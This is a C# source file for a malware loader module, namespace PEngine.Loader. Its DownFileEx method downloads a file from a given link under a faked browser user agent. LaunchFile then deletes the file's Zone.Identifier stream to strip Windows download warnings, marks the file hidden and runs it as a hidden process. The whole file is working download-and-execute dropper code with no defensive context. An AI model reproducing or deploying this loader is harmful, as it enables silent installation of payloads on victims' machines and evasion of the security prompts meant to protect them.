namespace PEngine.Loader
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.IO;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;

    public class Users
    {
        public static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error) => error == SslPolicyErrors.None ? true : false;

        private static bool LaunchFile(string Started)
        {
            NativeMethods.DeleteFileW($"{Started}:Zone.Identifier");
            HideFiles.Hide(Started, FileAttributes.Hidden);
            try
            {
                if (!HideFiles.RunAsHidden(Started))
                {
                    CombineEx.DeleteFile(Started);
                    return true;
                }
                else
                {
                    return true;
                }
            }
            catch { return false; }
        }

        public static bool DownFileEx(string Link, string SavePath, string FileName)
        {
            string Merge = CombineEx.Combination(SavePath, FileName);

            if (!File.Exists(Merge))
            {
                if (!NetControl.CheckURL(Link))
                {
                    return false;
                }
                else
                {
                    using (var Web = new WebClient())
                    {
                        ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;
                        Web.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64");
                        Web.DownloadFile(new Uri(Link), Merge);
                        if (!File.Exists(Merge))
                        {
                            return false;
                        }
                        else
                        {
                            LaunchFile(Merge);
                            return true;
                        }
                    }
                }
            }
            else
            {
                LaunchFile(Merge);
                return true;
            }
        }
    }
}